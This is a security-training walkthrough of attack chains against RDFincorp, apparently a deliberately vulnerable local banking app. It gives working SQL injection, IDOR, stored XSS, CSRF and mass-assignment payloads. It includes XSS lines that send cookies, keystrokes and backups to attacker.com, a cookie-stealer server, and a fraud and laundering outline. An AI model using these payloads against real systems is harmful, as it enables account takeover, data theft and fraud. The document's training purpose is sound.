# RDFincorp - Attack Chain Walkthrough

This document provides comprehensive walkthroughs of various attack chains demonstrating how multiple vulnerabilities can be combined for maximum impact.

## Prerequisites

- **BurpSuite Community/Pro** installed and configured
- **Browser** with proxy settings pointed to BurpSuite (127.0.0.1:8080)
- **RDFincorp Application** running at `http://localhost:3000`
- Basic understanding of web application vulnerabilities

## Table of Contents

1. [Setup and Configuration](#setup-and-configuration)
2. [Attack Chain 1: SQL Injection to Admin Access](#attack-chain-1-sql-injection-to-admin-access)
3. [Attack Chain 2: IDOR for Data Exfiltration](#attack-chain-2-idor-for-data-exfiltration)
4. [Attack Chain 3: XSS to Session Hijacking](#attack-chain-3-xss-to-session-hijacking)
5. [Attack Chain 4: CSRF to Financial Fraud](#attack-chain-4-csrf-to-financial-fraud)
6. [Attack Chain 5: Complete System Compromise](#attack-chain-5-complete-system-compromise)
7. [Attack Chain 6: Privilege Escalation via Mass Assignment](#attack-chain-6-privilege-escalation-via-mass-assignment)

---

## Setup and Configuration

### BurpSuite Configuration

1. **Start BurpSuite**
   ```bash
   # Navigate to BurpSuite installation directory
   java -jar burpsuite.jar
   ```

2. **Configure Browser Proxy**
   - Firefox: Preferences → Network Settings → Manual Proxy
   - HTTP Proxy: `127.0.0.1`
   - Port: `8080`
   - Check "Use this proxy for HTTPS"

3. **Enable Intercept**
   - In BurpSuite: Proxy → Intercept → Intercept is on

### Starting the Application

```bash
# Using Docker
docker-compose up -d

# Or manually
npm start
```

Navigate to `http://localhost:3000`

---

## Attack Chain 1: SQL Injection to Admin Access

**Objective**: Bypass authentication and gain admin access using SQL injection

### Step 1: Identify Injection Point

1. Navigate to `http://localhost:3000/auth/login`
2. Enter test credentials and submit
3. In BurpSuite, observe the POST request:

```http
POST /auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

email=test@example.com&password=test123
```

### Step 2: Test for SQL Injection

1. **Intercept the login request** in BurpSuite
2. **Modify the email parameter**:

```http
POST /auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

email=admin@rdfincorp.com' OR '1'='1' --&password=anything
```

3. **Forward the request**
4. **Result**: Successfully logged in as admin!

### Step 3: Verify Admin Access

- You should be redirected to `/admin/dashboard`
- View pending loan applications
- View all user data
- Access admin-only functions

### Attack Breakdown

**Vulnerable Code** (routes/auth.js):
```javascript
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
```

**Injected Query**:
```sql
SELECT * FROM users WHERE email = 'admin@rdfincorp.com' OR '1'='1' --' AND password = 'anything'
```

**Why it works**: The `OR '1'='1'` makes the WHERE clause always true, and `--` comments out the password check.

### Alternative SQL Injection Payloads

```sql
-- Bypass with comment
admin@rdfincorp.com'--

-- Always true condition
' OR 1=1--

-- Using UNION to extract data
' UNION SELECT id,email,password,full_name,account_number,balance,credit_score,is_admin,created_at FROM users WHERE email='admin@rdfincorp.com'--
```

---

## Attack Chain 2: IDOR for Data Exfiltration

**Objective**: Exploit IDOR vulnerabilities to extract sensitive data from all users

### Step 1: Login as Regular User

```
Email: john.doe@example.com
Password: password123
```

### Step 2: Enumerate User IDs

1. Navigate to your dashboard
2. In BurpSuite, find requests to `/api/user/2` (your user ID)
3. **Send to Repeater** (Ctrl+R)

### Step 3: Extract Other Users' Data

1. In Repeater, modify the request:

```http
GET /api/user/1 HTTP/1.1
Host: localhost:3000
Cookie: connect.sid=s%3A...
```

2. **Send** the request
3. **Response** contains admin's complete data:

```json
{
  "id": 1,
  "email": "admin@rdfincorp.com",
  "password": "admin123",  // ← Plaintext password!
  "full_name": "Administrator",
  "account_number": "RDFC-1000-0000-0001",
  "balance": 50000.00,
  "credit_score": 850,
  "is_admin": 1
}
```

### Step 4: Extract Credit Card Data

1. Send request to `/api/cards/1`:

```http
GET /api/cards/1 HTTP/1.1
Host: localhost:3000
Cookie: connect.sid=s%3A...
```

2. **Response includes CVV**:

```json
[
  {
    "id": 1,
    "user_id": 1,
    "card_number": "5495738137592321",
    "cvv": "123",  // ← Should never be returned!
    "expiry_date": "12/28",
    "card_type": "platinum",
    "credit_limit": 50000.00,
    "status": "active"
  }
]
```

### Step 5: Extract Transaction History

```http
GET /api/transactions/1 HTTP/1.1
```

**Result**: Complete transaction history of admin user

### Step 6: Automate Enumeration

Create a simple script or use BurpSuite Intruder:

1. **Send request to Intruder**
2. **Mark userId as payload position**: `/api/user/§1§`
3. **Payload type**: Numbers (1-100)
4. **Start attack**
5. **Result**: Extract data for all users

### Impact

- ✅ Extracted plaintext passwords for all users
- ✅ Obtained credit card numbers with CVVs  
- ✅ Accessed financial transaction data
- ✅ Identified admin accounts

---

## Attack Chain 3: XSS to Session Hijacking

**Objective**: Use stored XSS to steal admin session cookies

### Step 1: Setup Attack Server

Create a simple server to receive stolen cookies:

```javascript
// cookie-stealer.js
const express = require('express');
const app = express();

app.get('/steal', (req, res) => {
    console.log('Stolen cookie:', req.query.cookie);
    res.send('OK');
});

app.listen(4000, () => console.log('Listening on :4000'));
```

Run: `node cookie-stealer.js`

### Step 2: Inject XSS Payload

1. Login as regular user: `john.doe@example.com` / `password123`
2. Navigate to `/user/apply-loan`
3. Fill in loan application:
   - Amount: `25000`
   - Purpose: 
   
   ```html
   <script>
   fetch('http://localhost:4000/steal?cookie=' + document.cookie);
   </script>
   ```

4. Submit the application

### Step 3: Wait for Admin to View

When admin logs in and views pending loans:

1. XSS executes in admin's browser
2. Admin's session cookie is sent to attacker server
3. Attacker captures: `connect.sid=s%3AAdminSessionValue...`

### Step 4: Session Hijacking

1. In BurpSuite, intercept any request
2. Replace your cookie with stolen admin cookie:

```http
GET /admin/dashboard HTTP/1.1
Host: localhost:3000
Cookie: connect.sid=s%3AAdminSessionValue...
```

3. **Result**: Now accessing admin dashboard with admin privileges!

### Alternative XSS Payloads

```html
<!-- Image tag -->
<img src=x onerror="fetch('http://localhost:4000/steal?c='+document.cookie)">

<!-- Remote script  -->
<script src="http://localhost:4000/malicious.js"></script>

<!-- Advanced exfiltration -->
<script>
navigator.sendBeacon('http://localhost:4000/steal', 
    JSON.stringify({
        cookie: document.cookie,
        localStorage: localStorage,
        url: window.location.href
    })
);
</script>
```

---

## Attack Chain 4: CSRF to Financial Fraud

**Objective**: Use CSRF to execute unauthorized money transfers

### Step 1: Analyze Transfer Functionality

1. Login and navigate to dashboard
2. In BurpSuite, perform a legitimate transfer
3. Observe the request:

```http
POST /api/transfer HTTP/1.1
Host: localhost:3000
Cookie: connect.sid=...
Content-Type: application/json

{
    "from_user_id": 2,
    "to_account": "RDFC-1000-0000-0001",
    "amount": 100.00,
    "notes": "Test transfer"
}
```

**Notice**: No CSRF token!

### Step 2: Create Malicious Page

Create `csrf-attack.html`:

```html
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body onload="document.getElementById('attack').submit()">
    <h1>Claiming your prize...</h1>
    
    <form id="attack" action="http://localhost:3000/api/transfer" method="POST" 
          enctype="text/plain" style="display: none;">
        <input name='{"from_user_id": 2, "to_account": "RDFC-1000-0000-0001", 
                     "amount": 10000, "notes": "CSRF Attack", "x":"' 
               value='"}' type='hidden'>
    </form>
</body>
</html>
```

### Step 3: Execute Attack

1. Victim (logged into RDFincorp) visits `csrf-attack.html`
2. Form auto-submits transfer request
3. **Result**: $10,000 transferred from victim's account!

### Alternative CSRF Attacks

#### Auto-Approve Loans (Admin Only)

```html
<img src="http://localhost:3000/admin/approve-loan/1?action=approve&notes=CSRF">
```

#### Change User Balance

```html
<form action="http://localhost:3000/api/update-profile" method="POST">
    <input type="hidden" name="balance" value="1000000">
    <input type="submit" value="Update Profile">
</form>
```

---

## Attack Chain 5: Complete System Compromise

**Objective**: Chain multiple vulnerabilities for total system takeover

### Phase 1: Initial Access (SQL Injection)

1. **Bypass login** using SQLi: `admin@rdfincorp.com' OR '1'='1'--`
2. **Gain admin access**

### Phase 2: Persistence (XSS)

1. **Inject persistent XSS** in loan purpose field
2. **Payload**:
```html
<script>
if(document.cookie.includes('isAdmin=1')) {
    // Only trigger for admins
    fetch('/api/backup').then(r=>r.json()).then(data=>{
        fetch('http://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    });
}
</script>
```

### Phase 3: Lateral Movement (IDOR)

1. **Enumerate all users** via `/api/user/1`, `/api/user/2`, etc.
2. **Extract credentials** (plaintext passwords)
3. **Identify high-value targets** (high balance, good credit score)

### Phase 4: Data Exfiltration

1. **Extract all credit cards** with CVVs
2. **Download transaction history**
3. **Access database backup** endpoint: `/api/backup`

### Phase 5: Financial Fraud (CSRF + IDOR)

1. **Create CSRF pages** to transfer funds from multiple victims
2. **Use stolen credentials** to login as other users
3. **Apply for loans** in victims' names
4. **Approve fraudulent loans** using admin access

### Phase 6: Privilege Escalation (Mass Assignment)

1. **Create new admin account** via registration:

```http
POST /auth/register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=backdoor@evil.com&password=hacked123&full_name=Backdoor Admin&is_admin=1&balance=1000000&credit_score=850
```

2. **Maintain persistent access** even if original admin changes password

### Complete Compromise Achieved:

- ✅ Admin panel access
- ✅ All user credentials
- ✅ All credit card data with CVVs
- ✅ Complete financial  history
- ✅ Ability to transfer funds
- ✅ Ability to approve fraudulent loans
- ✅ Persistent backdoor account
- ✅ Complete database dump

---

## Attack Chain 6: Privilege Escalation via Mass Assignment

**Objective**: Create admin account through mass assignment vulnerability

### Step 1: Analyze Registration Process

1. **Navigate to** `/auth/register`
2. **In BurpSuite**, observe normal registration:

```http
POST /auth/register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=test@test.com&password=test123&full_name=Test User
```

### Step 2: Inject Admin Parameters

1. **Intercept registration request**
2. **Add malicious parameters**:

```http
POST /auth/register HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=hacker@evil.com&password=hacked123&full_name=Elite Hacker&is_admin=1&balance=9999999&credit_score=850
```

3. **Forward the request**

### Step 3: Verify Privilege Escalation

1. Login with new account: `hacker@evil.com` / `hacked123`
2. **Check cookies**: `isAdmin=1`
3. **Navigate to** `/admin/dashboard`
4. **Success**: Full admin access with $9,999,999 balance!

### Step 4: Maintain Access

The account now has:
- ✅ Admin privileges  
- ✅ Massive balance
- ✅ Perfect credit score
- ✅ Backdoor access independent of other admins

---

## BurpSuite Tips and Tricks

### Using Repeater

1. **Right-click** on any request → Send to Repeater
2. **Modify** request in Repeater tab
3. **Send** to see response
4. **Useful for**: Testing different IDOR IDs, SQLi payloads

### Using Intruder

1. **Right-click** → Send to Intruder
2. **Mark payload positions**: `/api/user/§1§`
3. **Set payload type**: Numbers, wordlist, etc.
4. **Attack**: Automate enumeration

### Using Proxy History

1. **Proxy** → HTTP History
2. **Filter** by domain: localhost:3000
3. **Analyze** all requests/responses
4. **Identify** patterns and vulnerabilities

### Useful Filters

```
Filter by response code: status_code:200
Filter by URL: /api/
Filter sensitive data: password|cvv|credit
```

---

## Defense Recommendations

After completing these attacks, you should understand:

1. **SQL Injection Prevention**
   - Use parameterized queries
   - ORM frameworks
   - Input validation

2. **IDOR Prevention**
   - Authorization checks
   - Indirect references
   - Access control middleware

3. **XSS Prevention**
   - Output encoding
   - Content Security Policy
   - Input sanitization

4. **CSRF Prevention**
   - CSRF tokens
   - SameSite cookies
   - Origin validation

5. **Access Control**
   - Server-side role verification
   - Principle of least privilege
   - Session management best practices

6. **Data Protection**
   - Password hashing (bcrypt)
   - Never store/return CVVs
   - Encrypt sensitive data
   - Remove debug endpoints

---

## Attack Chain 7: Profile Update - CSRF + Mass Assignment

**Objective**: Use CSRF to escalate privileges and manipulate balance via profile update

### Step 1: Analyze Profile Update

1. Login as user and navigate to `/user/profile`
2. Update your name, intercept in BurpSuite:

```http
POST /user/profile HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

full_name=John+Doe&email=john@example.com&password=newpass
```

**Notice**: No CSRF token! And accepts additional parameters!

### Step 2: Test Mass Assignment

1. In BurpSuite Repeater, add hidden parameters:

```http
POST /user/profile HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded

full_name=John+Doe&email=john@example.com&balance=999999&credit_score=850
```

2. Send request
3. **Check dashboard** - Balance is now $999,999!

### Step 3: Generate CSRF PoC

1. In BurpSuite, right-click on profile update request
2. **Engagement Tools** → **Generate CSRF PoC**
3. Modify generated HTML:

```html
<!DOCTYPE html>
<html>
<body>
  <form action="http://localhost:3000/user/profile" method="POST">
    <input type="hidden" name="full_name" value="Hacked User" />
    <input type="hidden" name="email" value="victim@example.com" />
    <input type="hidden" name="password" value="newpass123" />
    <input type="hidden" name="balance" value="999999" />
    <input type="hidden" name="credit_score" value="850" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

4. Save as `csrf-profile.html`
5. While logged in, open file → Auto-submits and updates everything!

### Impact

- ✅ Arbitrary balance modification
- ✅ Credit score manipulation  
- ✅ Unauthorized profile changes
- ✅ No CSRF protection
- ✅ Mass assignment vulnerability

---

## Attack Chain 8: Loan Approval Exploitation

**Objective**: Exploit loan approval to get automatic funds credited

### Step 1: Apply for Maximum Loan

1. Login as user: `john.doe@example.com`
2. Navigate to `/user/apply-loan`
3. Apply for loan:
   - Amount: `$100,000`
   - Purpose: `Home purchase`

### Step 2: Admin Approves Loan

1. Login as admin (via SQLi): `admin@rdfincorp.com' OR '1'='1' --`
2. View pending loans
3. **Test XSS**: In a different tab, apply for loan with XSS purpose:
   ```html
   <script>alert('XSS in Loan Purpose')</script>
   ```
4. As admin, view loans - XSS executes!
5. Approve the $100,000 loan

### Step 3: Verify Fund Credit

1. Logout and login as `john.doe@example.com`
2. **Check dashboard**:
   - Balance increased by $100,000
   - **Loan notification** shows: "Loan Approved - Credited to your account"
3. Funds available immediately!

### Exploitation Scenario

```
Regular user balance: $10,000
1. Apply for $50,000 loan
2. Self-approve using SQLi admin access
3. Balance becomes: $60,000
4. Repeat process
5. Unlimited money glitch!
```

### XSS in Loan Purpose

The loan purpose field is vulnerable to stored XSS:

```html
<!-- Cookie stealer -->
<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>

<!-- Keylogger -->
<script>document.onkeypress=e=>fetch('http://attacker.com/log?k='+e.key)</script>

<!-- Admin session hijack -->
<img src=x onerror="if(document.cookie.includes('isAdmin')){fetch('http://attacker.com/admin?s='+document.cookie)}">
```

---

## Attack Chain 9: Admin User Creation Backdoor

**Objective**: Use admin panel to create persistent backdoor admin accounts

### Step 1: Gain Admin Access

Use SQL injection: `admin@rdfincorp.com' OR '1'='1' --`

### Step 2: Navigate to Create User

1. In admin dashboard, scroll to **"Create New User"** section
2. Observe the form fields:
   - Full Name
   - Email
   - Password
   - Initial Balance
   - Credit Score
   - **Grant Admin Privileges** (checkbox)

### Step 3: Create Backdoor Admin

1. Fill in form:
   - Full Name: `Backdoor Admin`
   - Email: `backdoor@evil.com`
   - Password: `superSecretPassword123`
   - Initial Balance: `1000000`
   - Credit Score: `850`
   - ✅ Check "Grant Admin Privileges"

2. Submit form

### Step 4: Verify Backdoor

1. Logout
2. Login with new account: `backdoor@evil.com` / `superSecretPassword123`
3. Navigate to `/admin/dashboard`
4. **Success**: Full admin access!

### Step 5: Create Money Laundering Chain

```
1. Create user A with $1,000,000 (admin creation)
2. Create user B with $1,000,000
3. Transfer funds between accounts
4. Apply for loans and auto-approve
5. Create more accounts
6. Distributed fraud to avoid detection
```

### Vulnerability Analysis

**No validation on**:
- Number of admins created
- Balance limits
- Email verification
- Password strength
- Creation rate limiting

**Intentional flaws**:
```javascript
// routes/admin.js
const userIsAdmin = is_admin === 'on' ? 1 : 0;  // Direct assignment!
const userBalance = balance || 10000.00;        // Any balance accepted!
```

### Impact

- ✅ Unlimited admin account creation
- ✅ Set arbitrary balance for new users
- ✅ Set perfect credit scores
- ✅ Persistent backdoor access
- ✅ Distributed attack infrastructure

---

## Attack Chain 10: Complete Webinar Demo Chain

**Objective**: Full demonstration of attack chaining for security training

### Timeline (15 minutes)

**Phase 1: Initial Access (3 min)**
1. Show login page
2. Demonstrate SQLi: `admin@rdfincorp.com' OR '1'='1' --`
3. Gain admin dashboard access
4. Show all user data visible

**Phase 2: Data Exfiltration (3 min)**
1. Open BurpSuite Repeater
2. Show IDOR: `/api/user/1`, `/api/user/2`, etc.
3. Extract passwords (plaintext)
4. Extract credit cards with CVVs
5. Show `/api/backup` endpoint returning everything

**Phase 3: XSS Demonstration (3 min)**
1. Logout, login as regular user
2. Apply for loan with XSS:
   ```html
   <img src=x onerror="alert('XSS by: '+document.domain)">
   ```
3. Login as admin
4. View loans → XSS fires
5. Explain session stealing potential

**Phase 4: Financial Exploitation (3 min)**
1. Show profile CSRF + Mass Assignment:
   - Generate CSRF PoC
   - Add `balance=999999`
   - Demonstrate auto-submit
2. Show IDOR transfer attack:
   ```json
   {"from_user_id": 1, "to_account": "...", "amount": 50000}
   ```
   - Transfer FROM admin TO attacker

**Phase 5: Persistence (3 min)**
1. Create backdoor admin via admin panel
2. Approve own loan applications
3. Show notification system
4. Demonstrate complete control

### Key Talking Points

- **Defense in Depth**: One vulnerability = bad, multiple chained = catastrophic
- **Real-World Impact**: How attackers actually operate
- **Input Validation**: Trust nothing from client
- **Least Privilege**: Don't give admins unlimited power
- **Detection**: No logging = no visibility

---

## Quick Reference: All Vulnerabilities

| #  | Vulnerability | Location | Exploitation |
|----|--------------|----------|--------------|
| 1  | SQL Injection | `/auth/login` | `admin@rdfincorp.com' OR '1'='1' --` |
| 2  | Stored XSS | Loan purpose field | `<script>alert('XSS')</script>` |
| 3  | IDOR | `/api/user/:id`, `/api/cards/:id` | Change ID parameter |
| 4  | CSRF | Profile update, transfers | No CSRF token validation |
| 5  | Mass Assignment | Registration, profile | Add `is_admin=1`, `balance=999999` |
| 6  | No Balance Check | `/api/transfer` | Transfer more than you have |
 | 7  | Weak Access Control | Admin routes | Only checks `req.session.isAdmin` |
| 8  | Plaintext Passwords | Entire app | Passwords stored as-is in DB |
| 9  | CVV Exposure | `/api/cards/:id` | CVV returned in API response |
| 10 | Sensitive Endpoint | `/api/backup` | Returns entire user database |
| 11 | No Rate Limiting | All endpoints | Brute force, enumeration possible |
| 12 | Admin User Creation | `/admin/create-user` | Create unlimited admins |

---

## Conclusion

These attack chains demonstrate how real-world attackers combine multiple vulnerabilities to achieve their objectives. Understanding these techniques is crucial for:

- **Developers**: Building secure applications
- **Security Testers**: Comprehensive vulnerability assessment
- **Bug Bounty Hunters**: Maximizing impact and rewards
- **Students**: Learning practical security concepts
- **Webinar Presenters**: Demonstrating attack methodology

**Key Takeaways**:
1. Vulnerabilities are rarely exploited in isolation
2. Attack chains amplify impact exponentially  
3. Defense requires addressing ALL weaknesses
4. Security is a continuous process, not a checkbox
5. Education and awareness are critical

**Remember**: Only perform these attacks on systems you own or have explicit permission to test. Unauthorized hacking is illegal and unethical.

---

**Practice Responsibly. Hack Ethically.**

**Last Updated**: January 2026 - Complete with all features
